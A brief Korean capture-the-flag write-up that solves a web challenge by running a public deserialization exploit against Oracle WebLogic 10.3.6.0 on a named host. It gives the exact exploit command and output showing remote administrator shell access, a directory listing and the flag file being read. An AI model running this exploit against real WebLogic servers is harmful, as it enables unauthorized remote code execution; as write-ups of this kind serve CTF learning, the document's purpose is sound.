## Solve
- http://juwon1405.iptime.org:7001/console 에 접속을 하면 weblogic 10.3.6.0 버전을 사용하는 것을 알 수 있다.

- 구글링을 통해 weblogic의 취약점을 이용해 쉘을 얻는 스크립트코드를 발견했다.
따라서 실행을 시켜 서버의 권한을 얻을 수 있었고, C:\key.txt 를 읽었다. </br>
> https://github.com/hanc00l/weblogic_unserialize_exploit

</br>
**실행 명령어**
```
./weblogic.py -u juwon1405.iptime.org -p 7001 -os win -t exploit

```


</br>
## Result
```
~/machome/ctf/doubles_ctf/web-200-error/weblogic_unserialize_exploit/bin(master*) » ./weblogic.py -u juwon1405.iptime.org -p 7001 -os win -t exploit                stitch@certis
sending upload payload...
sending install payload...
execute "whoami"...
----------------------------------------
hezek-dns\administrator


----------------------------------------
exploit>dir C:\
 C 드라이브의 볼륨에는 이름이 없습니다.
 볼륨 일련 번호: E097-C9D7

 C:\ 디렉터리

2012-12-21  오후 07:58    <DIR>          ADFS
2012-12-21  오후 07:06                 0 AUTOEXEC.BAT
2015-12-16  오전 10:00    <DIR>          bea
2012-12-21  오후 07:06                 0 CONFIG.SYS
2012-12-21  오후 07:20    <DIR>          Documents and Settings
2012-12-21  오후 07:59    <DIR>          Inetpub
2017-03-25  오후 04:05                31 key.txt
2015-12-16  오전 09:56    <DIR>          Oracle
2012-12-21  오후 07:26    <DIR>          Program Files
2015-12-16  오후 02:13    <DIR>          WINDOWS
2012-12-21  오후 07:09    <DIR>          wmpub
               3개 파일                  31 바이트
               8개 디렉터리   4,545,699,840 바이트 남음


exploit>type C:\key.txt
weblogic_hacked!!_DoubleS1405!!


exploit>
```
